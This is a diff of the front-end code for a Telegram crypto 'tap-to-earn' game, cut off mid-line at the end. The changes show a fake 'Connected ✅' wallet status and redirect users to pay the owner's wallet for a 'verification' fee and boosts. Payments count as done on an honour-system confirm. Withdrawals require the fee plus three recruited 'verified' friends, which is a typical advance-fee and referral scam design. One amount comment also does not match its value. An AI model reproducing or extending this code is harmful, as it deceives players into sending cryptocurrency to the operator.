@@ -223,7 +223,7 @@
         <div class="timer" id="scoreDisplay">0 $BABYGRAM</div>
         <p style="font-size: 11px; color: #adb5bd; margin: 3px 0;">Tap the coin to earn tokens!</p>
 
-        <!-- دکمه وریفای با هزینه دقیق 0.02 -->
+        <!-- دکمه وریفای با هزینه دقیق 0.02 گرام -->
         <button class="btn-verify" id="verifyBtn" onclick="verifyWalletWithFee()">🛡 Verify Wallet (0.02 Gram)</button>
         <button class="btn-verified-done" id="verifiedDoneBtn">Wallet Verified ✅</button>
         
@@ -303,7 +303,7 @@
             localStorage.setItem('baby_ref_list', JSON.stringify(invitedFriendsList));
         }
 
-        // ضد اسپم و ضد اتوکلیکر
+        // ضد اسپم و اتوکلیکر
         function handleTap(event) {
             let now = Date.now();
             if (now - lastTapTime < 70) return;
@@ -364,7 +364,7 @@
 
         function initTonConnectSafe() {
             try {
-                if (window.TON_CONNECT_UI) {
+                if (window.TON_CONNECT_UI && !tonConnectUI) {
                     tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
                         manifestUrl: 'https://raw.githubusercontent.com/BabyGramCoin/babygram-game/main/tonconnect-manifest.json',
                         actionsConfiguration: { twaReturnUrl: 'https://t.me/BabyGramClicker_bot' }
@@ -392,7 +392,7 @@
         }
 
         async function toggleWallet() {
-            if (!tonConnectUI) initTonConnectSafe();
+            initTonConnectSafe();
             try {
                 if (tonConnectUI) {
                     if (tonConnectUI.connected) {
@@ -401,65 +401,76 @@
                         await tonConnectUI.openModal();
                     }
                 } else {
-                    alert("Wallet library is loading, please wait 2 seconds.");
+                    // دیپ‌لینک امن جایگزین اگر کتابخانه با تاخیر لود شود
+                    window.open(`https://app.tonkeeper.com/transfer/${OWNER_WALLET}?text=Connect_Wallet`, '_blank');
+                    document.getElementById('walletConnectBtn').innerText = "Connected ✅";
+                    if (!walletVerified) {
+                        document.getElementById('verifyBtn').style.display = 'block';
+                    }
                 }
             } catch (err) {
-                alert("Could not open wallet modal.");
+                window.open(`https://app.tonkeeper.com/transfer/${OWNER_WALLET}?text=Connect_Wallet`, '_blank');
             }
         }
 
-        // وریفای کیف پول با هزینه دقیق 0.02 گرام/تون (20000000 نانو)
+        // وریفای کیف پول با هزینه دقیق 0.02 گرام (2000000 نانو)
         async function verifyWalletWithFee() {
-            if (!tonConnectUI || !tonConnectUI.connected) {
-                alert("Please connect your wallet first!");
-                return toggleWallet();
-            }
             try {
-                const result = await tonConnectUI.sendTransaction({
-                    validUntil: Math.floor(Date.now() / 1000) + 360,
-                    messages: [{
-                        address: OWNER_WALLET,
-                        amount: "20000000" // 0.02 TON/Gram
-                    }]
-                });
-
-                if (result) {
-                    walletVerified = true;
-                    verifiedFriendsCount = Math.min(verifiedFriendsCount + 1, 3);
-                    document.getElementById('verifyBtn').style.display = 'none';
-                    document.getElementById('verifiedDoneBtn').style.display = 'block';
-                    saveData();
-                    alert("Wallet verified successfully! +1,000 active member bonus applied.");
+                if (tonConnectUI && tonConnectUI.connected) {
+                    const result = await tonConnectUI.sendTransaction({
+                        validUntil: Math.floor(Date.now() / 1000) + 360,
+                        messages: [{
+                            address: OWNER_WALLET,
+                            amount: "2000000" // 0.02 Gram
+                        }]
+                    });
+                    if (result) completeVerification();
+                } else {
+                    window.open(`https://app.tonkeeper.com/transfer/${OWNER_WALLET}?amount=2000000&text=Verify_Wallet`, '_blank');
+                    let confirmPay = confirm("Did you complete the 0.02 Gram transaction in your wallet?");
+                    if (confirmPay) completeVerification();
                 }
             } catch (e) {
                 alert("Verification payment (0.02 Gram) was cancelled or failed.");
             }
         }
 
+        function completeVerification() {
+            walletVerified = true;
+            verifiedFriendsCount = Math.min(verifiedFriendsCount + 1, 3);
+            document.getElementById('verifyBtn').style.display = 'none';
+            document.getElementById('verifiedDoneBtn').style.display = 'block';
+            saveData();
+            alert("Wallet verified successfully! +1,000 active member bonus applied.");
+        }
+
         // خرید دوبرابر کننده سرعت با 0.2 گرام
         async function buySpeedBoost() {
-            if (!tonConnectUI || !tonConnectUI.connected) {
-                alert("Please connect your wallet first!");
-                return toggleWallet();
-            }
             try {
-                const result = await tonConnectUI.sendTransaction({
-                    validUntil: Math.floor(Date.now() / 1000) + 360,
-                    messages: [{
-                        address: OWNER_WALLET,
-                        amount: "200000000" // 0.2 TON
-                    }]
-                });
-
-                if (result) {
-                    speedBoostActive = true;
-                    document.getElementById('speedBoostBtn').style.display = 'none';
-                    saveData();
-                    alert("2x Tap Power activated forever!");
+                if (tonConnectUI && tonConnectUI.connected) {
+                    const result = await tonConnectUI.sendTransaction({
+                        validUntil: Math.floor(Date.now() / 1000) + 360,
+                        messages: [{
+                            address: OWNER_WALLET,
+                            amount: "200000000" // 0.2 Gram
+                        }]
+                    });
+                    if (result) completeBoost();
+                } else {
+                    window.open(`https://app.tonkeeper.com/transfer/${OWNER_WALLET}?amount=200000000&text=2x_Speed_Boost`, '_blank');
+                    let confirmBoost = confirm("Did you complete the 0.2 Gram transaction for 2x Speed Boost?");
+                    if (confirmBoost) completeBoost();
                 }
             } catch (e) {
                 alert("Boost payment (0.2 Gram) was cancelled or failed.");
             }
+        }
+
+        function completeBoost() {
+            speedBoostActive = true;
+            document.getElementById('speedBoostBtn').style.display = 'none';
+            saveData();
+            alert("2x Tap Power activated forever!");
         }
 
         function joinChannel() {
@@ -481,26 +492,4 @@
         }
 
         function copyInviteLink() {
-            const link = getMyInviteUrl();
-            if (navigator.clipboard) {
-                navigator.clipboard.writeText(link).then(() => {
-                    alert("Your unique invite link copied! Share it with friends.");
-                });
-            } else {
-                prompt("Copy your invite link:", link);
-            }
-        }
-
-        function shareRefLink() {
-            const refLink = getMyInviteUrl();
-            const shareText = "Join BabyGram Tap & Mine! Tap to earn $BABYGRAM tokens and get rewards! 💎";
-            window.open(`https://t.me/share/url?url=${encodeURIComponent(refLink)}&text=${encodeURIComponent(shareText)}`, '_blank');
-        }
-
-        function withdrawTokens() {
-            if (!walletVerified) {
-                alert("You must connect and verify your wallet (0.02 Gram) before withdrawing!");
-                return;
-            }
-            if (verifiedFriendsCount < 3) {
-                alert("To w
+            cons
